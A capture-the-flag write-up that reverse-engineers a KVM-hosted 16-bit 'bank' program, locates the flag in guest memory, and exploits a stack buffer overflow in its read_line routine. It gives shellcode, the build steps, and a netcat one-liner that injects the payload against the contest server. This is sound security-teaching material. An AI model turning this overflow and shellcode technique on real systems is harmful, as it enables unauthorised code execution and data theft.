# The great bank heist

In this task the program to exploit is a 16-bit binary running in real mode.
This binary is run using [KVM](https://www.linux-kvm.org/page/Main_Page).

First we have to find out where the flag is loaded. By opening the `kvm` binary
with `radare2` we can take a look at the symbols provided. First `fs symbols`
switches to the symbols flagspace, and then `f` lists the symbols in the current
flagspace.
```
$ r2 kvm
[0x00000a70]> fs symbols
[0x00000a70]> f
0x00000928 23 sym._init
0x00000a70 42 entry0
0x00000a70 42 sym._start
0x00000aa0 50 sym.deregister_tm_clones
0x00000ae0 66 sym.register_tm_clones
0x00000b30 1 entry.fini0
0x00000b30 58 sym.__do_global_dtors_aux
0x00000b70 10 entry.init0
0x00000b70 0 sym.frame_dummy
0x00000b7a 185 sym.check_kvm_version
0x00000c33 117 sym.check_kvm_extension
0x00000ca8 687 sym.print_regs
0x00000f57 188 sym.setup_stack
0x00001013 386 sym.setup_secure_data
0x00001195 205 sym.trigger_singlestep
0x00001262 1396 main
0x00001262 1396 sym.main
...snip...
```

First we must analyze the binary using `aaa`:
```
[0x00000a70]> aa
[Invalid instruction of 15996 bytes at 0x1cb entry0 (aa)
Invalid instruction of 15927 bytes at 0x1cb
[x] Analyze all flags starting with sym. and entry0 (aa)
```

If we disassemble the `main` function by running `pdf@main` in radare2,
we see that the function is roughly doing the steps below this section.
The `pdf` command is short for `disassemble function`. You may check
what a command does by adding a question mark behind, like `pdf?`.
Keep in mind that in radare2 you need to analyze all functions before
disassembling by executing the command `aa`:
1. Open `/dev/kvm`.
2. Call `check_kvm_version` to verify the version is correct.
3. Call `check_kvm_extension` to check for necessary extensions to KVM (unrestricted guest mode).
4. Use `mmap` and `ioctls` on the fd for `/dev/kvm` to setup memory for the virtual machine.
5. Call `setup_stack` to setup the stack for the virtual machine.
6. Call `setup_secure_data` to load the flag into memory.
7. Do more `ioctls` to create a virtual CPU and set its registers to correct values.
8. Finally start the emulation and handle any I/O in a loop.

Let's look at the `setup_secure_data`-function to see how the secrets are loaded.

```
[0x00000a70]> pdf@sym.setup_secure_data
/ (fcn) sym.setup_secure_data 386
|   sym.setup_secure_data (uint32_t arg1);
|           ; var uint32_t fd @ rbp-0xa4
|           ; var file*stream @ rbp-0xa0
|           ; var void *s1 @ rbp-0x98
|           ; var int var_90h @ rbp-0x90
|           ; var int var_88h @ rbp-0x88
|           ; var int var_80h @ rbp-0x80
|           ; var void *var_78h @ rbp-0x78
|           ; var char *s2 @ rbp-0x70
|           ; var int canary @ rbp-0x8
|           ; arg uint32_t arg1 @ rdi
|           ; CALL XREF from main (0x13da)
|           0x00001013      55             push rbp
|           0x00001014      4889e5         mov rbp, rsp
|           0x00001017      4881ecb00000.  sub rsp, 0xb0
|           0x0000101e      89bd5cffffff   mov dword [fd], edi         ; arg1
|           0x00001024      64488b042528.  mov rax, qword fs:[0x28]    ; [0x28:8]=0x4428 ; '('
|           0x0000102d      488945f8       mov qword [canary], rax
|           0x00001031      31c0           xor eax, eax
|           0x00001033      488d35810900.  lea rsi, [0x000019bb]       ; "r" ; const char *mode
|           0x0000103a      488d3d7c0900.  lea rdi, str.._flag.txt     ; 0x19bd ; "./flag.txt" ; const char *filename
|           0x00001041      e8daf9ffff     call sym.imp.fopen          ; file*fopen(const char *filename, const char *mode)
|           0x00001046      48898560ffff.  mov qword [stream], rax
|           0x0000104d      4883bd60ffff.  cmp qword [stream], 0
|       ,=< 0x00001055      752a           jne 0x1081
|       |   0x00001057      488b05822620.  mov rax, qword [obj.stderr] ; obj.stderr__GLIBC_2.2.5 ; [0x2036e0:8]=0
|       |   0x0000105e      4889c1         mov rcx, rax                ; FILE *stream
|       |   0x00001061      ba19000000     mov edx, 0x19               ; size_t nitems
|       |   0x00001066      be01000000     mov esi, 1                  ; size_t size
|       |   0x0000106b      488d3d560900.  lea rdi, str.Could_not_open_flag.txt ; 0x19c8 ; "Could not open flag.txt!\n" ; const void *ptr
|       |   0x00001072      e8d9f9ffff     call sym.imp.fwrite         ; size_t fwrite(const void *ptr, size_t size, size_t nitems, FILE *stream)
|       |   0x00001077      bfffffffff     mov edi, 0xffffffff         ; -1 ; int status
|       |   0x0000107c      e8bff9ffff     call sym.imp.exit           ; void exit(int status)
|       |   ; CODE XREF from sym.setup_secure_data (0x1055)
|       `-> 0x00001081      488b9560ffff.  mov rdx, qword [stream]     ; FILE *stream
|           0x00001088      488d4590       lea rax, [s2]
|           0x0000108c      be64000000     mov esi, 0x64               ; 'd' ; int size
|           0x00001091      4889c7         mov rdi, rax                ; char *s
|           0x00001094      e827f9ffff     call sym.imp.fgets          ; char *fgets(char *s, int size, FILE *stream)
|           0x00001099      488b8560ffff.  mov rax, qword [stream]
|           0x000010a0      4889c7         mov rdi, rax                ; FILE *stream
|           0x000010a3      e8b8f8ffff     call sym.imp.fclose         ; int fclose(FILE *stream)
```

This first part opens a file called `flag.txt` and reads a single line from the file into memory.

```
|           0x000010a8      41b900000000   mov r9d, 0                  ; size_t offset
|           0x000010ae      41b8ffffffff   mov r8d, 0xffffffff         ; -1 ; int fd
|           0x000010b4      b921000000     mov ecx, 0x21               ; '!' ; int flags
|           0x000010b9      ba03000000     mov edx, 3                  ; int prot
|           0x000010be      be00100000     mov esi, 0x1000             ; size_t length
|           0x000010c3      bf00000000     mov edi, 0                  ; void*addr
|           0x000010c8      e8c3f8ffff     call sym.imp.mmap           ; void*mmap(void*addr, size_t length, int prot, int flags, int fd, size_t offset)
|           0x000010cd      48898568ffff.  mov qword [s1], rax
|           0x000010d4      488b8568ffff.  mov rax, qword [s1]
|           0x000010db      ba00100000     mov edx, 0x1000             ; size_t n
|           0x000010e0      be00000000     mov esi, 0                  ; int c
|           0x000010e5      4889c7         mov rdi, rax                ; void *s
|           0x000010e8      e8b3f8ffff     call sym.imp.memset         ; void *memset(void *s, int c, size_t n)
|           0x000010ed      488d4590       lea rax, [s2]
|           0x000010f1      4889c7         mov rdi, rax                ; const char *s
|           0x000010f4      e877f8ffff     call sym.imp.strlen         ; size_t strlen(const char *s)
|           0x000010f9      4889c2         mov rdx, rax                ; size_t n
|           0x000010fc      488d4d90       lea rcx, [s2]
|           0x00001100      488b8568ffff.  mov rax, qword [s1]
|           0x00001107      4889ce         mov rsi, rcx                ; const void *s2
|           0x0000110a      4889c7         mov rdi, rax                ; void *s1
|           0x0000110d      e8def8ffff     call sym.imp.memcpy         ; void *memcpy(void *s1, const void *s2, size_t n)
```

A single 4kb page of memory is `mmap`-ed, zeroed out using memset, and then the
flag is copied to the freshly allocated memory.

```
|           0x00001112      48c78570ffff.  mov qword [var_90h], 0
|           0x0000111d      48c78578ffff.  mov qword [var_88h], 0
|           0x00001128      48c745800000.  mov qword [var_80h], 0
|           0x00001130      48c745880000.  mov qword [var_78h], 0
|           0x00001138      c78570ffffff.  mov dword [var_90h], 2
|           0x00001142      48c78578ffff.  mov qword [var_88h], 0xee000
|           0x0000114d      48c745800010.  mov qword [var_80h], 0x1000
|           0x00001155      488b8568ffff.  mov rax, qword [s1]
|           0x0000115c      48894588       mov qword [var_78h], rax
|           0x00001160      488d9570ffff.  lea rdx, [var_90h]
|           0x00001167      8b855cffffff   mov eax, dword [fd]
|           0x0000116d      be46ae2040     mov esi, 0x4020ae46         ; unsigned long request
|           0x00001172      89c7           mov edi, eax                ; int fd
|           0x00001174      b800000000     mov eax, 0
|           0x00001179      e832f8ffff     call sym.imp.ioctl          ; int ioctl(int fd, unsigned long request)
|           0x0000117e      90             nop
|           0x0000117f      488b45f8       mov rax, qword [canary]
|           0x00001183      644833042528.  xor rax, qword fs:[0x28]
|       ,=< 0x0000118c      7405           je 0x1193
|       |   0x0000118e      e8edf7ffff     call sym.imp.__stack_chk_fail ; void __stack_chk_fail(void)
|       |   ; CODE XREF from sym.setup_secure_data (0x118c)
|       `-> 0x00001193      c9             leave
\           0x00001194      c3             ret
```

This last part loads the memory into the virtual machine's address space
using an IOCTL on the `/dev/kvm` file descriptor.
The argument type for this IOCTL is a type `struct kvm_memory_region`,
which is defined as follows:

```
struct kvm_memory_region {
	__u32 slot;
	__u32 flags;
	__u64 guest_phys_addr;
	__u64 memory_size; /* bytes */
};
```

For our `ioctl` the values are as follows, `slot=2`, `flags=0`,
`guest_phys_addr=0xee000`, `memory_size=0x1000`.
So the memory containing the flag has been loaded into guest physical address `0xEE000`.

Now that we have figured out where the flag is stored,
we will have to figure out how to exploit the program
running in the virtual machine.
Helpfully we have been provided with an elf-binary with debugging symbols
to analyze.

Note: since this 16-bit binary is generated by GCC it actually uses a lot of
32-bit registers, this is possible on modern processors by using the
`0x66` opcode prefix.


```
$ objdump -d elfbank -mi386 -Maddr16,data16 elfbank
00001000 <print-0xf>:
    1000:	b8 00 00             	mov    $0x0,%ax
    1003:	8e d0                	mov    %ax,%ss
    1005:	bc ff ff             	mov    $0xffff,%sp
    1008:	66 e8 c6 01 00 00    	calll  11d4 <_start>
    100e:	f4                   	hlt

0000100f <print>:
... snip ...

0000102f <read_line>:
    102f:	66 55                	push   %ebp
    1031:	66 89 e5             	mov    %esp,%ebp
    1034:	66 53                	push   %ebx
    1036:	67 66 8b 4d 08       	mov    0x8(%ebp),%ecx
    103b:	66 ba f8 03 00 00    	mov    $0x3f8,%edx
    1041:	ec                   	in     (%dx),%al
    1042:	67 88 01             	mov    %al,(%ecx)
    1045:	67 66 8d 59 01       	lea    0x1(%ecx),%ebx
    104a:	3c 0a                	cmp    $0xa,%al
    104c:	74 05                	je     1053 <read_line+0x24>
    104e:	66 89 d9             	mov    %ebx,%ecx
    1051:	eb ee                	jmp    1041 <read_line+0x12>
    1053:	67 c6 01 00          	movb   $0x0,(%ecx)
    1057:	66 5b                	pop    %ebx
    1059:	66 5d                	pop    %ebp
    105b:	66 c3                	retl

0000105d <strcmp>:
... snip ...

0000108c <atoi>:
... snip ...

000010bf <get_account_no>:
    10bf:	66 55                	push   %ebp
    10c1:	66 89 e5             	mov    %esp,%ebp
    10c4:	66 53                	push   %ebx
    10c6:	66 83 ec 10          	sub    $0x10,%esp
    10ca:	66 68 22 12 00 00    	pushl  $0x1222
    10d0:	66 e8 39 ff ff ff    	calll  100f <print>
    10d6:	67 66 8d 5d ec       	lea    -0x14(%ebp),%ebx
    10db:	66 53                	push   %ebx
    10dd:	66 e8 4c ff ff ff    	calll  102f <read_line>
    10e3:	66 53                	push   %ebx
    10e5:	66 e8 a1 ff ff ff    	calll  108c <atoi>
    10eb:	66 5a                	pop    %edx
    10ed:	67 66 8b 5d fc       	mov    -0x4(%ebp),%ebx
    10f2:	66 c9                	leavel
    10f4:	66 c3                	retl

000010f6 <handle_cmd>:
    10f6:	66 55                	push   %ebp
    10f8:	66 89 e5             	mov    %esp,%ebp
    10fb:	66 53                	push   %ebx
    10fd:	67 66 8b 5d 08       	mov    0x8(%ebp),%ebx
    1102:	66 68 35 12 00 00    	pushl  $0x1235
    1108:	66 53                	push   %ebx
    110a:	66 e8 4d ff ff ff    	calll  105d <strcmp>
    1110:	66 59                	pop    %ecx
    1112:	66 5a                	pop    %edx
    1114:	66 85 c0             	test   %eax,%eax
    1117:	75 33                	jne    114c <handle_cmd+0x56>
    1119:	66 68 3a 12 00 00    	pushl  $0x123a
    111f:	66 e8 ea fe ff ff    	calll  100f <print>
    1125:	66 68 4a 12 00 00    	pushl  $0x124a
    112b:	66 e8 de fe ff ff    	calll  100f <print>
    1131:	66 68 70 12 00 00    	pushl  $0x1270
    1137:	66 e8 d2 fe ff ff    	calll  100f <print>
    113d:	66 83 c4 0c          	add    $0xc,%esp
    1141:	67 66 c7 45 08 89 12 	movl   $0x1289,0x8(%ebp)
    1148:	00 00
    114a:	eb 7e                	jmp    11ca <handle_cmd+0xd4>
    114c:	66 68 ab 12 00 00    	pushl  $0x12ab
    1152:	66 53                	push   %ebx
    1154:	66 e8 03 ff ff ff    	calll  105d <strcmp>
    115a:	66 59                	pop    %ecx
    115c:	66 5a                	pop    %edx
    115e:	66 85 c0             	test   %eax,%eax
    1161:	75 0b                	jne    116e <handle_cmd+0x78>
    1163:	67 66 c7 45 08 b2 12 	movl   $0x12b2,0x8(%ebp)
    116a:	00 00
    116c:	eb 5c                	jmp    11ca <handle_cmd+0xd4>
    116e:	66 68 c5 12 00 00    	pushl  $0x12c5
    1174:	66 53                	push   %ebx
    1176:	66 e8 e1 fe ff ff    	calll  105d <strcmp>
    117c:	66 59                	pop    %ecx
    117e:	66 5a                	pop    %edx
    1180:	66 85 c0             	test   %eax,%eax
    1183:	75 24                	jne    11a9 <handle_cmd+0xb3>
    1185:	66 e8 34 ff ff ff    	calll  10bf <get_account_no>
    118b:	66 3d 39 05 00 00    	cmp    $0x539,%eax
    1191:	75 0b                	jne    119e <handle_cmd+0xa8>
    1193:	67 66 c7 45 08 cd 12 	movl   $0x12cd,0x8(%ebp)
    119a:	00 00
    119c:	eb 2c                	jmp    11ca <handle_cmd+0xd4>
    119e:	67 66 c7 45 08 dc 12 	movl   $0x12dc,0x8(%ebp)
    11a5:	00 00
    11a7:	eb 21                	jmp    11ca <handle_cmd+0xd4>
    11a9:	66 68 ef 12 00 00    	pushl  $0x12ef
    11af:	66 e8 5a fe ff ff    	calll  100f <print>
    11b5:	66 53                	push   %ebx
    11b7:	66 e8 52 fe ff ff    	calll  100f <print>
    11bd:	66 58                	pop    %eax
    11bf:	66 5a                	pop    %edx
    11c1:	67 66 c7 45 08 06 13 	movl   $0x1306,0x8(%ebp)
    11c8:	00 00
    11ca:	67 66 8b 5d fc       	mov    -0x4(%ebp),%ebx
    11cf:	66 c9                	leavel
    11d1:	e9 3b fe             	jmp    100f <print>

000011d4 <_start>:
    11d4:	66 55                	push   %ebp
    11d6:	66 89 e5             	mov    %esp,%ebp
    11d9:	66 53                	push   %ebx
    11db:	66 83 ec 40          	sub    $0x40,%esp
    11df:	66 68 80 15 00 00    	pushl  $0x1580
    11e5:	66 e8 24 fe ff ff    	calll  100f <print>
    11eb:	66 68 14 13 00 00    	pushl  $0x1314
    11f1:	66 e8 18 fe ff ff    	calll  100f <print>
    11f7:	66 58                	pop    %eax
    11f9:	66 5a                	pop    %edx
    11fb:	66 68 3c 13 00 00    	pushl  $0x133c
    1201:	66 e8 08 fe ff ff    	calll  100f <print>
    1207:	67 66 8d 5d bc       	lea    -0x44(%ebp),%ebx
    120c:	66 53                	push   %ebx
    120e:	66 e8 1b fe ff ff    	calll  102f <read_line>
    1214:	66 53                	push   %ebx
    1216:	66 e8 da fe ff ff    	calll  10f6 <handle_cmd>
    121c:	66 83 c4 0c          	add    $0xc,%esp
    1220:	eb d9                	jmp    11fb <_start+0x27>
```

There is a function called `read_line` that uses IO-port functions to read
characters from the terminal.
These IO-port functions are handled in the loop in the main `kvm`
program, which will call `getchar` whenever the guest requests a character.

The `read_line` function is very vulnerable to a buffer overflow, and if the
receiving buffer is on the stack we can overwrite the return address and
execute our own code.

By typing `help` at the shell we can get a listing of the available commands.
The `balance`-command is particularly interesting since it calls the
`read_line` function and contains a return.

```
$ nc bank.tghack.no 5432
     kvm.c:32  - KVM version check: 12
 ######   ########  #### ##    ##  ######    #######  ######## ########  ######
##    ##  ##     ##  ##  ###   ## ##    ##  ##     ##    ##       ##    ##    ##
##        ##     ##  ##  ####  ## ##        ##     ##    ##       ##    ##
##   #### ########   ##  ## ## ## ##   #### ##     ##    ##       ##     ######
##    ##  ##   ##    ##  ##  #### ##    ##  ##     ##    ##       ##          ##
##    ##  ##    ##   ##  ##   ### ##    ##  ##     ##    ##       ##    ##    ##
 ######   ##     ## #### ##    ##  ######    #######     ##       ##     ######
Central bank mainframe system v1.3.3.7
CMD> help
COMMAND LIST:
- help: lists all available commands
- status: system status
- balance: check account balance
CMD> balance
Enter account no: 1337
Balance: 1337
CMD>
```

A possible way to exploit this is:
1. Run the `balance`-command
2. Overflow the buffer that the account number is being read into.
Putting our code on the stack, and overwriting the return address to point to
our code.

First we construct our shellcode. Since we know the secrets are at
memory location `0xEE000` this is where we will have to extract them from.

One possible shellcode is the following:
```
31 c0                	xor    %ax,%ax
b4 ee                	mov    $0xee,%ah
8e d8                	mov    %ax,%ds
66 6a 00             	pushl  $0x0
66 6a 00             	pushl  $0x0
b8 0f 10             	mov    $0x100f,%ax
ff e0                	jmp    *%ax
```

To create this shellcode we can create a `shellcode.s` file:
```
.code16gcc
.globl _start
.org 0x0

_start:
xor %ax, %ax
movb $0xEE, %ah
movw %ax, %ds
pushl $0
pushl $0
movw $0x100f,%ax
jmp %ax
```

In addition we need a linker script, `elf_script.ld`:
```
SECTIONS
{
    . = 0x1000;
    .text :
    {
        *(.text);
    }
    .data :
    {
        *(.data);
        *(.bss);
        *(.rodata);
    }
    _heap = ALIGN(4);
}
```

We can then compile the shellcode:

```
$ gcc -m16 shellcode.s -Telf_script.ld -nostdlib -o shellcode
shellcode.s: Assembler messages:
shellcode.s:12: Warning: indirect jmp without `*'
```

And finally extract the shellcode as a hex encoded string using `objdump`
```
$ objdump -z -d shellcode|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr '\n' ' '| tr '\t' ' '|tr -s ' '|sed 's/ $//g'|sed 's/ /\\x/g'
\x31\xc0\xb4\xee\x8e\xd8\x66\x6a\x00\x66\x6a\x00\xb8\x0f\x10\xff\xe0
```

This uses a clever trick with the x86 segment registers.
First we zero the `ax`-register. By setting `ah` to `0xee` the `ax` register
will be set to `0xee00` since `ah` is a shortcut to access the top 8 bits of `ax`.
Then we set `ds` to be equal to the value in `ax`,
this has to be done in a roundabout way due to architectural limitations.

Since the `ds` register is now set to `0xEE00`  all regular memory access
(i.e. `mov`-instructions) will now use `0xEE000`, which is the value in the `ds`
register shifted four bits to the left, as a base address.

An example of this is the instruction `mov 0x10, %ax`. Normally this would move
the 16 bits of memory at physical address `0x10` into the `ax`-register.
With our current `ds` register value the processor will instead move data from
memory location `0xEE010`, the formula for calulating the real address the
processor uses is `ds<<4 + addr`.
Similarly we can set the `cs` (code segment) register to a value and then all
instruction fetches by the processor would be similarly 'rewritten'.
This trick enables a puny 16-bit microprocessor to access more RAM than is
possible using only 16-bit pointers.

Back to our exploit code! Since we set the `ds` register to `0xEE00` and the
memory we want to access is at location `0xEE000` we can simply tell the
`print`-function to start printin from memory location 0,
since `0xEE00<<4 + 0 == 0xEE000`.

The string we need to send in then becomes
```
balance\n // Trigger balance function
\x31\xc0\xb4\xee\x8e\xd8\x66\x6a\x00\x66\x6a\x00\xb8\x0f\x10\xff\xe0 //Shellcode
\xf4\xf4\xf4\xf4\xf4\xf4\xf4 // Padding
\x7F\xff\x00\x00\n // Return address
```

The most difficult part of this is finding the necessary return address,
but given that the first part of the disassembly of the elfbank file does the
following:

```
    1000:	b8 00 00             	mov    $0x0,%ax
    1003:	8e d0                	mov    %ax,%ss
    1005:	bc ff ff             	mov    $0xffff,%sp
```

... then we know that the stack starts at `0xFFFF`, and we can calculate the
expected value for our buffer, which is at  `0xFF7F` by looking at the stack
usage of each function until the `get_account_no` function.

```
 echo -en "balance\n\x31\xc0\xb4\xee\x8e\xd8\x66\x6a\x00\x66\x6a\x00\xb8\x0f\x10\xff\xe0\xf4\xf4\xf4\xf4\xf4\xf4\xf4\x7F\xff\x00\x00\n" | nc bank.tghack.no 5432
     kvm.c:32  - KVM version check: 12
 ######   ########  #### ##    ##  ######    #######  ######## ########  ######
##    ##  ##     ##  ##  ###   ## ##    ##  ##     ##    ##       ##    ##    ##
##        ##     ##  ##  ####  ## ##        ##     ##    ##       ##    ##
##   #### ########   ##  ## ## ## ##   #### ##     ##    ##       ##     ######
##    ##  ##   ##    ##  ##  #### ##    ##  ##     ##    ##       ##          ##
##    ##  ##    ##   ##  ##   ### ##    ##  ##     ##    ##       ##    ##    ##
 ######   ##     ## #### ##    ##  ######    #######     ##       ##     ######
Central bank mainframe system v1.3.3.7
CMD> Enter account no: TG19{bank_goblings_heisted}
KVM_EXIT_INTERNAL_ERROR: suberror = 0x1
```

And we got the flag! We also crashed the bank application,
but I'm sure that's going to sort itself out soon enough :)
